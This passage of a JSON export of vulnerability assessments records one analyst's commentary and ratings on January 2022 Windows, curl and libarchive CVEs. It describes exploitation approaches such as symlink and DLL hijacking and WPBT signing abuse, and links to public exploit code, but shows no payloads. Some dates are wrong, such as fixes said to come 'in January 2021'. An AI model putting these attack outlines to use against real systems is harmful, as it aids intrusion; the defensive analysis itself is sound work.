          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "b655f7b7-5e31-46df-ba69-75cf98df401a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "84e04fcd-fe92-4d8d-85b7-ab4da819040c",
      "created": "2022-01-11T22:48:18.842837Z",
      "revisionDate": "2022-01-12T17:00:25.643807Z",
      "document": "Original report for this vulnerability can be found at https://curl.se/docs/CVE-2021-22947.html\r\n\r\nThis vulnerability affects curl 7.20.0 to 7.78.0 inclusive, and occurs due to the commit made at https://github.com/curl/curl/commit/ec3bb8f727405.\r\n\r\nThe bug occurs as when `curl` connects to a IMAP, POP3, SMTP, or FTP server using STARTTLS to upgrade the connection to a TLS connection. In these scenarios the server can send multiple responses prior to the TLS upgrade, which are then cached by curl.\r\n\r\nUnfortunately, when upgrading to TLS, curl would not flush this queue of cached responses and instead would treat these responses as part of the TLS handshake themselves as if they were authenticated.\r\n\r\nAttackers could use this to inject fake response data via a man in the middle (MITM) attack when the connection uses POP3 or IMAP as noted by the curl developers.\r\n\r\nIt is interesting to note that this bug was disclosed via HackerOne in September 2021 but was only fixed by Microsoft in January 2021 as noted at https://www.zerodayinitiative.com/blog/2022/1/11/the-january-2022-security-update-review, meaning there was at least a 3 month gap between the bug being public knowledge and it being fixed.\r\n\r\nAs for the exploitability of this bug, it is fairly low due to the need to be able to conduct a MITM attack against a target user. Additionally using implicit TLS instead of using STARTTLS negates this issue so attackers would have to find a connection specifically using STARTTLS. \r\n\r\nIt should be noted though that may applications use libcurl, the affected library, even if they don't explicitly advertise it, so there is a good possibility that a fair number of apps on Windows would use this in some manner.\r\n\r\nAs a final note, its not directly clear to me why Microsoft rates this as a RCE bug but I imagine they likely found a connection between an attacker MITM'ing a specific connection for one of their apps and forging a fake response that can then be used to trigger some form of RCE. No details are provided on which app this might be though, so the specifics of this remain to be seen.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "73d49c55-452d-4fc8-83bf-4f4b6e0fdafd",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "661dd084-eca6-458a-9dcd-2ddd65ed48a3",
      "created": "2022-01-11T23:26:53.273909Z",
      "revisionDate": "2022-01-12T17:00:15.77336Z",
      "document": "This looks to be a Use-After-Free bug in libarchive 3.4.1 through 3.5.1 that was only recently patched by Microsoft in January 2021, though the details on this bug were public as early as June 2021 in https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=32375. It remains unclear if this was fully fixed though as https://github.com/libarchive/libarchive/issues/1554 is still open which references https://github.com/libarchive/libarchive/pull/1491 as being the fix, yet that PR is on hold as of today (January 11th 2021), and that relies on https://github.com/libarchive/libarchive/pull/1492 which is in turn dependent on https://github.com/libarchive/libarchive/pull/1493. All of this leads to a bit of a confusing mess as to if this bug has truely been fixed or not.\r\n\r\nThis bug occurs in `copy_string` which is in turn called from `do_uncompress_block` and `process_block`. These functions exist within the  `libarchive/libarchive/archive_read_support_format_rar5.c` file, as can be seen by looking at https://github.com/libarchive/libarchive/blob/411284e3f5819a5726622f3f129ebf2859f2d46b/libarchive/archive_read_support_format_rar5.c, and are related to parsing RAR5 archive files.\r\n\r\nSo what is RAR5 archive files? Well turns out according to https://www.remosoftware.com/info/differences-between-rar-and-rar5-compression that RAR4 was the default archive compression mechanism for RAR files. RAR5 is the new compression algorithm that is trying to rival 7ZIP and similar compression formats and is an evolution of the RAR4 format. The article also notes that right now WinRAR is the most likely program to open these newer file formats.\r\n\r\nFrom this we can conclude that this bug most likely occurs when sending a user a RAR5 file and a Windows program that uses the system's version of the libarchive library attempts to extract the RAR5 file, which will cause a UAF condition that, if controlled, could allow the attacker to gain RCE on a users computer.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "d52bb866-986e-4cc3-a12e-7131770d5771",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "c32e9872-b8a4-43f3-a8cc-05532aa65e51",
      "created": "2022-01-12T00:07:17.640631Z",
      "revisionDate": "2022-03-30T16:09:16.014374Z",
      "document": "Update: As predicted there is a patch bypass for this, now labled as [CVE-2022-26904](https://attackerkb.com/topics/RHSMbN1NQY/cve-2022-26904)\r\n\r\nAccording to https://twitter.com/KLINIX5/status/1480996599165763587 this appears to be a patch for the code blogged about at https://halove23.blogspot.com/2021/10/windows-user-profile-service-0day.html. The details on this bug can be found at https://github.com/klinix5/ProfSvcLPE/blob/main/write-up.docx but I'll summarize them here for brevity.\r\n\r\nThe original incomplete patch, aka [CVE-2021-34484](https://attackerkb.com/topics/qo2zIGKm9O/cve-2021-34484) is explained best by Mitja Kolsek at https://blog.0patch.com/2021/11/micropatching-incompletely-patched.html where he notes that bug was originally considered to be an arbitrary directory deletion bug that allowed a logged on user to delete a folder on the computer.\r\n\r\nHowever upon reviewing the fix KLINUX5 found that it was possible to not only bypass the fix, but also make the vulnerability more impactful. \r\n\r\nSpecifically by abusing the User Profile Service's code which creates a temporary user profile folder (to protect against the original user profile folder being damaged etc), and then copies folders and files from the original profile folder to the backup, one can instead place a symbolic link. When this symbolic link is followed, it can allow the attacker to create attacker-writeable folders in a protected location and then perform a DLL hijacking attack against high privileged system processes.\r\n\r\nUnfortunately when patching this bug, Microsoft correctly assumed that one should check that the temporary user folder (aka `C:\\Users\\TEMP`), is not a symbolic link, but didn't check to see if any of the folders under `C:\\Users\\TEMP` contains a symbolic link.\r\n\r\nNote that as noted in https://blog.0patch.com/2021/11/micropatching-incompletely-patched.html this bug does require winning a race condition so exploitation is 100% reliable however there are ways to win the race condition as was shown in the code for the patch bypass published at https://github.com/klinix5/ProfSvcLPE/tree/main/DoubleJunctionEoP.\r\n\r\nI'd keep an eye on this one as KLINIX5 has a habit of finding patch bypasses for his bugs and if he says Microsoft has messed things up again, more than likely there will be another patch bypass for this bug. I'm still looking into exactly what was patched here though.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "82a5730d-ede5-4fba-b2d0-4ce69ce2cddb",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "353efd04-0aa4-404c-aef4-5b0ea6dd3716",
      "created": "2022-01-12T15:09:56.88701Z",
      "revisionDate": "2022-01-12T16:59:58.242328Z",
      "document": "This appears to be a vulnerability in the Windows Platform Binary Table verification, also known as WPBT verification for short. It appears this was originally discovered back in September 2021 by Mickey Shkatov and the researchers of Eclypsium, who published a paper on this titled [Everyone Gets a Rootkit](https://eclypsium.com/2021/09/23/everyone-gets-a-rootkit/) where they detailed this bug in greater detail.\r\n\r\nSimply put, WPBT was introduced in Windows 8 that is an extension to an earlier protocol known as ACPI, or Advanced Configuration and Power Interface, which was originally designed to efficiently manage energy consumption in PCs. A flaw was found in WPBT verification whereby expired or compromised signatures could still be used to sign a WPBT binary, as these drivers were not in the kernel driver block list, which is stored as a file named `driver.stl`.\r\n\r\nBy signing a WPBT binary of the attackers creation with one of these expired or compromised certificates, authenticated attackers could get malicious code to load with kernel privileges when the target device boots up.\r\n\r\nWPBT binaries are particularly powerful as they allow OEMS to modify the host operating system during boot. This is often needed to supply vendor-specific drivers, applications and content. As a result, compromising the integrity of this stage of the Windows OS loading process means that an attacker can install a rootkit onto the target system to easily maintain stealthy and persistent access to the target machine.\r\n\r\nIts also important to note that this attack works even with Secured-core PCs running with the latest boot protections and mitigations. Therefore this vulnerability fundamentally this undercuts a lot of the new mitigations that were introduced with Windows 10 and Windows 11 to try prevent supply chain compromise and rootkit installation, which is a serious compromise of trust..\r\n\r\nOverall I have rated this vulnerability as high on attacker value since this is essentially the highest form of privileges you can possibly get on a Windows OS, going beyond even SYSTEM level access to strike at the very heart of the OS itself, however the exploitability is somewhat lower as you would need to craft a valid WPBT binary, something that would take some time to research since I imagine not many people are familiar with how to do that. Signing it with a compromised/expired certificate though shouldn't be that hard to do though :)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Persistence",
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "75f3c35a-df53-4bdc-ae45-4deea5f1ab3a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "94426e48-60c7-4ff9-b613-def3c83ab5ff",
      "created": "2022-01-12T15:50:00.951512Z",
      "revisionDate": "2022-01-12T16:57:23.534516Z",
      "document": "This appears to be a bug in Windows Event Tracing which is a kernel level tracing facility in Windows that allows you to log kernel events or application defined events to a log file. The bug occurs due to something related to Discretionary Access Control Lists or DACLS for short. DACLs in Windows are an access control mechanism made up of a bunch of ACE, or Access Control Entries, put together into a list. Note however that if a DACL does not exist on an object, everyone is allowed access to it and if a DACL is set on an object but not ACE entries are added to the DACL, no one is allowed access to it.\r\n\r\nMy guess is that somehow it is possible to create a DACL on a specific file or object as any authenticated user that does not have any ACE entries associated with it and thereby cause a component to stop working completely due to its need to access that file. Adding to the fact that this only causes a DoS, is the fact that this bug supposedly only works on Windows 10 1809 and Windows Server 2019, which further limits its impact.\r\n\r\nOverall a pretty low impact bug in my opinion.",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "a86e6cea-1bfe-49e9-8eee-99b138622454",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "92a80a42-56d9-415e-a545-9f135dab7616",
      "created": "2022-01-12T16:41:52.729566Z",
      "revisionDate": "2022-01-12T16:57:10.549789Z",
      "document": "Writeup for this vulnerability is rather interesting and I think a few people may have read the Microsoft advisory somewhat incorrectly.\r\n\r\nThe attack vector for this is listed as local which is odd given this is listed as an RCE vulnerability in the Windows Security Center API.\r\n\r\nHowever looking at Microsoft's description closer we can see that the Attack Vector value of Local is also applied if `the attacker relies on User Interaction by another person to perform actions required to exploit the vulnerability`.\r\n\r\nLooking further down the assessment we can see the complexity is considered Low, no privileges are required, however User Interaction is marked as Required.\r\n\r\nThis suggests that it is possible to somehow exploit this vulnerability by either sending the target a request which then opens a prompt that they have to interact with, or by sending them some malicious document which then triggers the vulnerability.\r\n\r\nGiven this has a high impact on both Confidentiality, Integrity, and Availability I would say this likely gives you pretty high level access should you be able to exploit it successfully.\r\n\r\nThe patch was likely applied to the `wscsvc.dll` file given the modification dates and info on the web about how the Windows Security Service works, but I'll have to do a more in depth analysis to determine what exactly was changed. Hopefully this information is useful for now though.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "b24955c3-e8a3-4993-9160-c6525a3b1c7d",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "cfacc796-ea84-4ca4-8af8-499395f5c4f1",
      "created": "2022-01-12T17:23:54.417827Z",
      "revisionDate": "2022-01-12T17:23:54.416296Z",
      "document": "Privilege escalation in Active Directory Domain Services that allows for elevation of privilege across a network.\r\n\r\nGiven how popular Active Directory is this is pretty serious and I imagine this will likely be a very popular way to escalate privileges in internal engagements should an exploit come out for this.\r\n\r\nBug is noted as being related to Active Directory Domain Service environments that have incoming trusts, and that the bug allows attackers to escalate privileges across the trust boundary under certain conditions.\r\n\r\nThe fact that this is labeled as \"under certain conditions\" leads me to believe that this may not be a default configuration which is why I have labeled it as such in my report. However I would also provide a slight counterpoint to this in that AD networks are often sprawling and complex so there is a good likelihood that this may be enabled in some part of the network even if you are not aware of it.\r\n\r\nDefinitely one to patch if you are running AD networks.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b77a4b5c-c5ab-44b4-a353-880cbf0287cf",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "63a430e8-8d62-427f-b218-f02ce3aff964",
      "created": "2022-01-12T17:43:12.462341Z",
      "revisionDate": "2022-01-12T17:43:12.461311Z",
      "document": "Huh so this one is a bit of a doozy. On the one hand we have Microsoft Exchange Server, which, unless you have been living under a rock, has been exploited many times in the past, as evidenced [here](https://www.bleepingcomputer.com/news/microsoft/microsoft-urges-exchange-admins-to-patch-bug-exploited-in-the-wild/), [here](https://practical365.com/another-exchange-vulnerability-revealed-with-attempted-exploits-seen-in-the-wild/), and [here](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/). Basically Microsoft Exchange Server has a giant target on its back and attackers are all too happy to exploit it given any opportunity to do so.\r\n\r\nWhat makes this bug interesting though is that unlike most of the other vulnerabilities which were exploitable remotely, this one not only requires authentication, but also requires local network access of some type. Its also interesting to note that the Scope section of Microsoft's advisory is marked as Changed, which they take as meaning `An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the vulnerable component and the impacted component are different and managed by different security authorities.`. \r\n\r\nThis raises a few questions as it seems to suggest that the initial component used to exploit the vulnerability exists in one security context separate from the Exchange Server security context, which when combined with the Adjacent factor, suggests a rather unusual way of exploiting this vulnerability via some local access, presumably though some component with a different security boundary, which then interacts with the Exchange Server.\r\n\r\nExploitation is however listed as easy and the bug does give you high level permissions on the Exchange Server, so I can see this as being useful for internal attacks once an attacker has gotten initial access into a network. As per usual, it is always advisable to assume that your network has been compromised when considering what to patch; I have personally seen that its often the little vulnerabilities that were ignored instead of being patched combined together that can lead to some of the most unexpected and dangerous impacts to companies.\r\n\r\nOverall I'd say this is likely lower on your patch list than other RCE bugs, however given the impact and number of previous exploits for this target, I'd still recommend patching this as soon as possible, presumably once all your RCE bugs have been patched.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "7c6714df-69dc-4dd5-be5a-a5e7645fa2b0",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "259fd67a-8f7b-45a6-aaaf-9c46938f2f4e",
      "created": "2022-01-12T18:06:16.103282Z",
      "revisionDate": "2022-01-12T18:06:16.103004Z",
      "document": "Of all the bugs in January 2022's Patch Tuesday analysis, I think this one has to be hands down the most complex one to exploit. There is very little information from the advisory on what this bug is however here is what I can piece together from the limited bits of information that are available.\r\n\r\nSupposively this affects virtual machines, although its a little confusing cause if we look at the list of affected products we can see this goes all the way back to Windows 7,  Hyper-V was released in 2008 with Windows Server 2008, which means that Windows 7 SP1 would also make sense since Windows 7 was released on October 22, 2019. This makes me believe that this is likely related to HyperV, but I cannot confirm this 100% at this time.\r\n\r\nThe second interesting thing is that the vulnerability is in IDE. Looking this up we can find https://www.techtarget.com/searchstorage/definition/IDE where its noted that IDE stands for Integrated Drive Electronics and is a standard that defines the connection between a bus line on a motherboard and the computer's disk storage devices.\r\n\r\nTherefore if I had to take a stab at this I'd say this is some sort of vulnerability in HyperV that is related to how disk drives interface with the Virtual Machine, specifically in how HyperV virtualizes the IDE protocol when interacting with virtual disks.\r\n\r\nOverall as this was found by Microsoft Research and Engineering and the attack complexity is listed as High, I doubt any public details will be coming out on this anytime soon, however if your organization uses Hyper-V and advanced technical attackers are within your risk profile, then I'd recommend patching this vulnerability ASAP. Otherwise, do try to patch this vulnerability when you can, but note that there are plenty of other vulns that are likely higher risk than this one in this months advisory.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "d0d49386-feb6-4f8d-ad83-63981514f975",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "05a14bc3-4305-4b88-bc2e-c327e2b15c75",
      "created": "2022-01-12T18:49:53.542471Z",
      "revisionDate": "2022-01-17T07:20:45.893212Z",
      "document": "Update: There appears to be some initial patch analysis on this vulnerability at https://piffd0s.medium.com/patch-diffing-cve-2022-21907-b739f4108eee which seems to suggest the patched functions are **UlFastSendHttpResponse**, **UlpAllocateFastTracker** **UlpFastSendCompleteWorker**, **UlpFreeFastTracker**, and **UlAllocateFastTrackerToLookaside**. They also note that based on their analysis `a safe assumption may be that the vulnerable code path is hit first in UlFastSendHttpResponse and some of the fixup / mitigations were applied to memory chunks in the other functions`. Analysis is still ongoing though.\r\n\r\nThere has been a lot of confusion r.e this vulnerability, which is a RCE in the HTTP Trailer Support feature of the http.sys component which is responsible for the HTTP Protocol stack used by several high privileged Windows components. The best writeup I was able to find was at https://isc.sans.edu/diary/28234 however note that investigation is still ongoing and its likely that things will change over time.\r\n\r\nFirst off, to be clear, despite `http.sys` appearing to be associated with IIS, this is not in itself an IIS vulnerability. As noted at https://isc.sans.edu/diary/28234, you can find which components are using `http.sys` by running the command `netsh http show servicestate`. You'll likely find more components using it then you thought, for example Intel components use this for some odd built in HTTP server (yeah I'm not sure either but there you go).\r\n\r\nSecondly, whilst the vulnerability affects Windows 10 1809 and Windows Server 2019 and later, by default, and only on Windows 10 1809 and Windows Serve r 2019, `HKLM:\\System\\CurrentControlSet\\Services\\HTTP\\Parameter\\EnableTrailerSupport` is set to 0 by default, thus disabling the vulnerable trailers feature. This means these versions are not vulnerable out of the box, however if the `HKLM:\\System\\CurrentControlSet\\Services\\HTTP\\Parameter\\EnableTrailerSupport` registry key is set to 1 then they are. All other affected versions of Windows are vulnerable using their default settings.\r\n\r\nAs this is a kernel level vulnerability and it being exploited remotely I imagine now would be a good time to remind people that RCE bugs in the Windows kernel have become increasingly hard to exploit. Whilst Windows 7 was easier to exploit due to lack of a number of mitigations, with Windows 10 and Windows 11, several mitigations have been implemented into the Windows kernel specifically to prevent RCE kernel exploits and from my experience they work very well to this effect (local privilege escalation attacks are another story which still needs improvement though).\r\n\r\nFinally as for those wondering what Trailer support is anyway (like myself), https://isc.sans.edu/diary/28234 notes that RFC7230 specifies the protocol for trailer support, noting that it only makes sense if `Transfer-Encoding: chunked` is used in a request to a server. This allows a requestor to essentially chunk the request up into several smaller packets and then only send the headers for the request after the request body has been sent. The original idea behind this was that the request body may be generated over time and we want to start sending data as it becomes available to speed things up and ensure quicker operations.\r\n\r\nHopefully that helps, still not a lot of detail on this right now and there will likely need to be some patch diffing going on before people are able to better determine the root cause of this issue, but for now I'd say patch if you can whilst also keeping in mind a working exploit will likely take time to develop if its possible given Microsoft's kernel level mitigations for Windows 10.",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "ee8be268-fe33-4378-b062-28f01b460b8a",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "d39690ff-d0af-444c-bef3-bf2b4aa29332",
      "created": "2022-01-12T19:00:27.315484Z",
      "revisionDate": "2022-01-12T19:00:27.315848Z",
      "document": "Looks like this is your fairly typical maliciously crafted document exploit for Microsoft Office. These bugs are used all the time by APTs and other groups simply cause its relatively easy to convince people to open documents given the right context, and even though some people will be fairly vigilant, all it takes is compromising one user to get an initial foothold into a target network.\r\n\r\nThis bug appears to affect all Microsoft Office versions since 2013 up to and including the latest Microsoft Office online solutions and also including Microsoft Sharepoint Servers from 2013 onwards, meaning that it has quite a wide range of potential targets. User interaction is required though in the form of opening a malicious document, \r\n\r\nGiven the supposedly low complexity of exploiting this vulnerability combined with the wide range of target that it can exploit, I'd expect to see exploits for this vulnerability in the wild over the coming few months.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "61be62d9-113f-487c-86a9-509024fe8f99",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "3436e6b4-55de-4951-b5b7-e3df619bc5b0",
      "created": "2022-01-14T07:49:53.036426Z",
